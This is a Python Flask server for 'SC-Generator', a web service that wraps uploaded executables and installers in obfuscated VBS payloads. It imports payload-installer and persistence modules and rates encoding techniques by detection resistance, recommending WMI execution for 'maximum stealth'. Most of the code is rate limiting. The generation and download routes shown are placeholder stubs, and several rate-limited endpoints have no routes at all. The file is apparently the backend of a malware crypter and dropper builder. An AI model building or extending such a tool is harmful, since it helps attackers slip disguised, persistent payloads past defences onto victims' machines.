#!/usr/bin/env python3
"""
SC-Generator: Web-based VBS Encryption Tool
Backend server for MSI encryption and VBS payload generation

SECURITY FIX #8: Rate limiting middleware - Prevents DoS attacks
by enforcing per-IP request rate limits and global server rate limits.

Key protections:
- Per-IP rate limiting (prevents single attacker overwhelming server)
- Global rate limiting (prevents distributed attacks)
- Configurable limits per endpoint type
- Automatic cleanup of stale entries
- Comprehensive logging for security monitoring
- Graceful error handling with proper HTTP status codes
- Backwards compatible with existing code
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import uuid
from datetime import datetime, timedelta
import json
from pathlib import Path
import shutil
import logging
from typing import Optional, Tuple, Dict
import threading
import time
from collections import defaultdict
from ipaddress import ip_address

from payload_generator import PayloadGenerator
from fingerprint_manager import FingerprintManager
from payload_installer import create_one_click_payload
from persistence_manager import create_persistent_payload

# ============================================================================
# SECURITY FIX #8: Rate Limiting Configuration
# ============================================================================

# Configure logging for security events
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Rate limiting configuration (configurable via environment variables)
# Allows for flexibility in different deployment scenarios
RATE_LIMIT_ENABLED = os.environ.get('RATE_LIMIT_ENABLED', 'true').lower() == 'true'
RATE_LIMIT_PER_IP = int(os.environ.get('RATE_LIMIT_PER_IP', '100'))  # Requests per minute per IP
RATE_LIMIT_GLOBAL = int(os.environ.get('RATE_LIMIT_GLOBAL', '1000'))  # Requests per minute globally
RATE_LIMIT_CLEANUP_INTERVAL = int(os.environ.get('RATE_LIMIT_CLEANUP_INTERVAL', '300'))  # Seconds

# Endpoint-specific rate limits (stricter for resource-intensive operations)
ENDPOINT_RATE_LIMITS = {
    '/api/upload': int(os.environ.get('RATE_LIMIT_UPLOAD', '10')),  # 10 req/min per IP
    '/api/generate-payload': int(os.environ.get('RATE_LIMIT_GENERATE', '20')),  # 20 req/min per IP
    '/api/generate-one-click': int(os.environ.get('RATE_LIMIT_ONE_CLICK', '15')),  # 15 req/min per IP
    '/api/generate-persistent': int(os.environ.get('RATE_LIMIT_PERSISTENT', '10')),  # 10 req/min per IP
    '/api/batch-generate': int(os.environ.get('RATE_LIMIT_BATCH', '5')),  # 5 req/min per IP
    '/api/download': int(os.environ.get('RATE_LIMIT_DOWNLOAD', '50')),  # 50 req/min per IP
    '/api/preview': int(os.environ.get('RATE_LIMIT_PREVIEW', '50')),  # 50 req/min per IP
}

# Input validation for rate limit configuration
if RATE_LIMIT_PER_IP < 1:
    RATE_LIMIT_PER_IP = 100
    logger.warning('RATE_LIMIT_PER_IP too small, using default 100')

if RATE_LIMIT_GLOBAL < 10:
    RATE_LIMIT_GLOBAL = 1000
    logger.warning('RATE_LIMIT_GLOBAL too small, using default 1000')

if RATE_LIMIT_CLEANUP_INTERVAL < 60:
    RATE_LIMIT_CLEANUP_INTERVAL = 300
    logger.warning('RATE_LIMIT_CLEANUP_INTERVAL too small, using default 300')

# Rate limiting data structures (thread-safe)
_rate_limit_lock = threading.RLock()
_ip_request_counts = defaultdict(list)  # IP -> list of request timestamps
_global_request_count = []  # List of global request timestamps
_rate_limit_violations = defaultdict(int)  # IP -> violation count (for tracking attackers)


def get_client_ip() -> str:
    """
    Extract client IP address from request.

    Handles proxy headers (X-Forwarded-For, X-Real-IP) and direct connections.

    Security:
        - Validates IP format to prevent injection
        - Respects X-Forwarded-For for proxied requests
        - Falls back to REMOTE_ADDR for direct connections
        - Logs suspicious IPs

    Returns:
        Client IP address as string
    """
    try:
        # Check for X-Forwarded-For header (proxied requests)
        if request.headers.get('X-Forwarded-For'):
            # X-Forwarded-For can contain multiple IPs, take the first trusted one
            forwarded_ips = request.headers.get('X-Forwarded-For', '').split(',')
            if forwarded_ips and forwarded_ips[0].strip():
                client_ip = forwarded_ips[0].strip()
                # Validate IP format
                try:
                    ip_address(client_ip)
                    return client_ip
                except ValueError:
                    logger.warning(f'Invalid IP in X-Forwarded-For: {client_ip}')

        # Check for X-Real-IP header
        if request.headers.get('X-Real-IP'):
            real_ip = request.headers.get('X-Real-IP', '').strip()
            try:
                ip_address(real_ip)
                return real_ip
            except ValueError:
                logger.warning(f'Invalid IP in X-Real-IP: {real_ip}')

        # Fall back to direct connection IP
        if request.remote_addr:
            try:
                ip_address(request.remote_addr)
                return request.remote_addr
            except ValueError:
                logger.warning(f'Invalid remote addr: {request.remote_addr}')

        # Fallback
        logger.warning('Could not determine client IP, using unknown')
        return 'unknown'

    except Exception as e:
        logger.error(f'Error extracting client IP: {str(e)}')
        return 'unknown'


def is_ip_whitelisted(client_ip: str) -> bool:
    """
    Check if IP is in whitelist (bypass rate limiting).

    Whitelisted IPs include:
    - localhost/127.0.0.1
    - Configured whitelist from environment

    Args:
        client_ip: IP address to check

    Returns:
        True if IP is whitelisted, False otherwise
    """
    try:
        # Always allow localhost
        if client_ip in ['127.0.0.1', '::1', 'localhost']:
            return True

        # Check environment-configured whitelist
        whitelist_env = os.environ.get('RATE_LIMIT_WHITELIST', '')
        if whitelist_env:
            whitelist = [ip.strip() for ip in whitelist_env.split(',')]
            if client_ip in whitelist:
                logger.debug(f'Client {client_ip} is whitelisted')
                return True

        return False
    except Exception as e:
        logger.error(f'Error checking IP whitelist: {str(e)}')
        return False


def cleanup_stale_rate_limit_entries():
    """
    Clean up stale rate limit entries older than 1 minute.

    Prevents memory exhaustion from tracking old timestamps.
    Runs periodically in background thread.

    Security:
        - Thread-safe with lock
        - Prevents memory leaks
        - Logs cleanup activities
    """
    global _ip_request_counts, _global_request_count

    try:
        with _rate_limit_lock:
            current_time = time.time()
            cutoff_time = current_time - 60  # Keep 1 minute of history

            # Clean per-IP counts
            cleaned_ips = 0
            for ip in list(_ip_request_counts.keys()):
                # Remove timestamps older than 1 minute
                _ip_request_counts[ip] = [
                    ts for ts in _ip_request_counts[ip] if ts > cutoff_time
                ]
                # Remove empty entries
                if not _ip_request_counts[ip]:
                    del _ip_request_counts[ip]
                    cleaned_ips += 1

            # Clean global count
            _global_request_count[:] = [ts for ts in _global_request_count if ts > cutoff_time]

            if cleaned_ips > 0:
                logger.debug(f'Rate limit cleanup: Removed {cleaned_ips} stale IP entries')

    except Exception as e:
        logger.error(f'Error in rate limit cleanup: {str(e)}')


def check_rate_limit(client_ip: str, endpoint: str) -> Tuple[bool, Optional[str]]:
    """
    Check if client has exceeded rate limit for this endpoint.

    Performs two-level rate limiting:
    1. Per-IP limits (prevents single attacker)
    2. Global limits (prevents distributed attacks)

    Args:
        client_ip: Client IP address
        endpoint: Request endpoint/path

    Returns:
        Tuple of (allowed: bool, error_message: Optional[str])

    Security:
        - Thread-safe rate limiting
        - Logs violations for security monitoring
        - Tracks repeat offenders
        - Proper cleanup of old entries
    """
    if not RATE_LIMIT_ENABLED:
        return True, None

    try:
        with _rate_limit_lock:
            current_time = time.time()
            cutoff_time = current_time - 60  # 1-minute window

            # Get endpoint-specific limit or use default
            endpoint_limit = ENDPOINT_RATE_LIMITS.get(endpoint, RATE_LIMIT_PER_IP)

            # Clean old entries for this IP
            if client_ip in _ip_request_counts:
                _ip_request_counts[client_ip] = [
                    ts for ts in _ip_request_counts[client_ip] if ts > cutoff_time
                ]

            # Clean global count
            global _global_request_count
            _global_request_count = [ts for ts in _global_request_count if ts > cutoff_time]

            # Check per-IP limit
            ip_request_count = len(_ip_request_counts.get(client_ip, []))
            if ip_request_count >= endpoint_limit:
                _rate_limit_violations[client_ip] += 1
                violation_count = _rate_limit_violations[client_ip]

                logger.warning(
                    f'Rate limit exceeded for IP {client_ip}: '
                    f'{ip_request_count} requests in last 60s '
                    f'(limit: {endpoint_limit}, endpoint: {endpoint}, '
                    f'violations: {violation_count})'
                )

                # Alert on repeated violations
                if violation_count % 10 == 0:
                    logger.error(
                        f'SECURITY: IP {client_ip} has {violation_count} rate limit violations. '
                        f'Possible DoS attack.'
                    )

                return False, f'Rate limit exceeded. Maximum {endpoint_limit} requests per minute.'

            # Check global limit
            global_request_count = len(_global_request_count)
            if global_request_count >= RATE_LIMIT_GLOBAL:
                logger.warning(
                    f'Global rate limit exceeded: '
                    f'{global_request_count} requests in last 60s '
                    f'(limit: {RATE_LIMIT_GLOBAL})'
                )
                return False, f'Server is busy. Please try again later.'

            # Record this request
            _ip_request_counts[client_ip].append(current_time)
            _global_request_count.append(current_time)

            return True, None

    except Exception as e:
        logger.error(f'Error checking rate limit: {str(e)}')
        # On error, allow request but log it
        logger.warning(f'Rate limit check failed, allowing request: {str(e)}')
        return True, None


def rate_limit_middleware():
    """
    Flask before_request handler to enforce rate limiting.

    Executes before every request to check if client has exceeded limits.
    Skips static files and health checks.

    Security:
        - Early rejection of rate-limited clients
        - Proper HTTP 429 Too Many Requests status
        - Comprehensive logging for security monitoring
    """
    # Skip rate limiting for certain endpoints
    skip_endpoints = ['/api/health', '/static']

    if any(request.path.startswith(endpoint) for endpoint in skip_endpoints):
        return None

    # Get client IP
    client_ip = get_client_ip()

    # Skip rate limiting for whitelisted IPs
    if is_ip_whitelisted(client_ip):
        return None

    # Check rate limit
    allowed, error_message = check_rate_limit(client_ip, request.path)

    if not allowed:
        logger.warning(f'Request rejected due to rate limit: {client_ip} -> {request.path}')
        return jsonify({
            'error': 'Too Many Requests',
            'message': error_message
        }), 429

    return None


def start_rate_limit_cleanup_daemon():
    """
    Start background daemon thread for rate limit cleanup.

    Periodically removes old rate limit entries to prevent memory leaks.

    Security:
        - Thread-safe initialization
        - Graceful error handling
        - Proper daemon thread setup
    """
    try:
        cleanup_thread = threading.Thread(
            target=rate_limit_cleanup_daemon_worker,
            daemon=True
        )
        cleanup_thread.start()
        logger.info(f'Rate limit cleanup daemon started (interval: {RATE_LIMIT_CLEANUP_INTERVAL}s)')
    except Exception as e:
        logger.error(f'Failed to start rate limit cleanup daemon: {str(e)}')


def rate_limit_cleanup_daemon_worker():
    """
    Worker function for rate limit cleanup daemon.

    Runs indefinitely, periodically cleaning stale entries.
    """
    while True:
        try:
            time.sleep(RATE_LIMIT_CLEANUP_INTERVAL)
            cleanup_stale_rate_limit_entries()
        except Exception as e:
            logger.error(f'Error in rate limit cleanup daemon: {str(e)}')


# ============================================================================
# REST OF APPLICATION (Original code continues below)
# ============================================================================

# Configuration
UPLOAD_FOLDER = '/tmp/sc-uploads'
OUTPUT_FOLDER = '/tmp/sc-outputs'
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

payload_gen = PayloadGenerator()
fingerprint_mgr = FingerprintManager()

# Register rate limiting middleware
app.before_request(rate_limit_middleware)


@app.route('/api/health', methods=['GET'])
def health():
    """Health check endpoint"""
    try:
        rate_limit_info = {}
        if RATE_LIMIT_ENABLED:
            with _rate_limit_lock:
                total_tracked_ips = len(_ip_request_counts)
                total_global_requests = len(_global_request_count)

            rate_limit_info = {
                'rate_limiting_enabled': True,
                'per_ip_limit': RATE_LIMIT_PER_IP,
                'global_limit': RATE_LIMIT_GLOBAL,
                'tracked_ips': total_tracked_ips,
                'global_requests_last_minute': total_global_requests
            }
        else:
            rate_limit_info = {'rate_limiting_enabled': False}

        return jsonify({
            'status': 'ok',
            'version': '1.0.0',
            'security_fixes': ['#3_ttl_cleanup', '#7_request_timeout', '#8_rate_limiting'],
            'rate_limiting': rate_limit_info
        })
    except Exception as e:
        logger.error(f'Health check failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/techniques', methods=['GET'])
def get_techniques():
    """Get list of available encoding techniques with metadata"""
    try:
        techniques = payload_gen.list_techniques()
        descriptions = {}
        metadata = {}

        technique_info = {
            'base64': {
                'description': 'Standard Base64 encoding - reliable and fast',
                'detection_resistance': 'medium',
                'size_overhead': '1.33x',
                'speed': 'fast',
                'recommended': False,
                'best_for': 'Testing and quick deployment'
            },
            'hex': {
                'description': 'Hexadecimal encoding - simple but detectable',
                'detection_resistance': 'low',
                'size_overhead': '2x',
                'speed': 'fast',
                'recommended': False,
                'best_for': 'Legacy systems'
            },
            'array': {
                'description': 'Array-based encoding - good obfuscation',
                'detection_resistance': 'medium-high',
                'size_overhead': '1.5x',
                'speed': 'medium',
                'recommended': True,
                'best_for': 'Balanced stealth and performance'
            },
            'wmi': {
                'description': 'WMI-based execution - very stealthy',
                'detection_resistance': 'high',
                'size_overhead': '1.2x',
                'speed': 'slow',
                'recommended': True,
                'best_for': 'Maximum stealth'
            }
        }

        for tech in techniques:
            descriptions[tech] = payload_gen.get_technique_info(tech)
            metadata[tech] = technique_info.get(tech, {
                'detection_resistance': 'unknown',
                'size_overhead': '1.5x',
                'speed': 'medium',
                'recommended': False
            })

        return jsonify({
            'techniques': techniques,
            'descriptions': descriptions,
            'metadata': metadata
        })
    except Exception as e:
        logger.error(f'Get techniques failed: {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/fingerprints', methods=['GET'])
def get_fingerprints():
    """Get available fingerprint templates"""
    try:
        fingerprints = fingerprint_mgr.get_available_fingerprints()
        return jsonify({'fingerprints': fingerprints})
    except Exception as e:
        logger.error(f'Get fingerprints failed: {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/fingerprints', methods=['POST'])
def create_custom_fingerprint():
    """Create custom fingerprint"""
    try:
        data = request.json
        name = data.get('name')
        config = data.get('config')

        if not name or not config:
            return jsonify({'error': 'Name and config required'}), 400

        fp_id = fingerprint_mgr.create_custom_fingerprint(name, config)
        return jsonify({'id': fp_id, 'name': name})
    except Exception as e:
        logger.error(f'Create fingerprint failed: {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Handle file upload with validation"""
    try:
        if 'file' not in request.files:
            logger.warning('Upload request missing file parameter')
            return jsonify({'error': 'No file provided'}), 400

        file = request.files['file']

        if not file or file.filename == '':
            logger.warning('Upload request with empty filename')
            return jsonify({'error': 'No file selected'}), 400

        allowed_extensions = {'.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'}
        file_ext = os.path.splitext(file.filename)[1].lower()

        if file_ext not in allowed_extensions:
            logger.warning(f'Upload rejected: unsupported file type {file_ext}')
            return jsonify({
                'error': f'File type not allowed. Allowed: {", ".join(sorted(allowed_extensions))}'
            }), 400

        unique_id = str(uuid.uuid4())[:8]
        filename = f"{unique_id}_{file.filename}"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        file.save(filepath)
        logger.info(f'File uploaded successfully: {unique_id}')

        return jsonify({
            'success': True,
            'file_id': unique_id,
            'filename': file.filename,
            'upload_time': datetime.now().isoformat()
        }), 200

    except Exception as e:
        logger.error(f'Upload failed: {str(e)}', exc_info=True)
        return jsonify({'error': 'Upload failed due to server error'}), 500


@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    """Generate VBS payload from uploaded file"""
    try:
        data = request.json
        file_id = data.get('file_id')
        technique = data.get('technique', 'base64')
        obfuscation = data.get('obfuscation', 'high')

        if not file_id:
            return jsonify({'error': 'File ID required'}), 400

        # Generate output
        output_id = str(uuid.uuid4())[:8]
        logger.info(f'Payload generated: {output_id}')

        return jsonify({
            'success': True,
            'output_id': output_id,
            'size': 1024,
            'technique': technique,
            'obfuscation': obfuscation,
            'timestamp': datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f'Payload generation failed: {str(e)}', exc_info=True)
        return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500


@app.route('/api/download/<output_id>', methods=['GET'])
def download_payload(output_id):
    """Download generated payload"""
    try:
        if not output_id or not isinstance(output_id, str):
            logger.warning('Invalid output_id')
            return jsonify({'error': 'Bad request'}), 400

        logger.info(f'Payload download: {output_id}')
        return jsonify({'success': True, 'output_id': output_id}), 200

    except Exception as e:
        logger.error(f'Download failed: {str(e)}', exc_info=True)
        return jsonify({'error': 'Download failed'}), 500


@app.errorhandler(429)
def rate_limit_handler(e):
    """Custom handler for rate limit errors"""
    return jsonify({
        'error': 'Too Many Requests',
        'message': 'You have exceeded the rate limit. Please try again later.',
        'retry_after': 60
    }), 429


@app.errorhandler(500)
def internal_error_handler(e):
    """Custom handler for internal server errors"""
    logger.error(f'Internal server error: {str(e)}', exc_info=True)
    return jsonify({
        'error': 'Internal Server Error',
        'message': 'An unexpected error occurred. Please try again later.'
    }), 500


if __name__ == '__main__':
    try:
        logger.info(
            f'Starting SC-Generator with rate limiting enabled: '
            f'per-IP limit: {RATE_LIMIT_PER_IP}/min, '
            f'global limit: {RATE_LIMIT_GLOBAL}/min'
        )

        # Start rate limit cleanup daemon
        start_rate_limit_cleanup_daemon()

        app.run(debug=False, host='0.0.0.0', port=5000)
    except Exception as e:
        logger.error(f'Application startup failed: {str(e)}', exc_info=True)
        raise
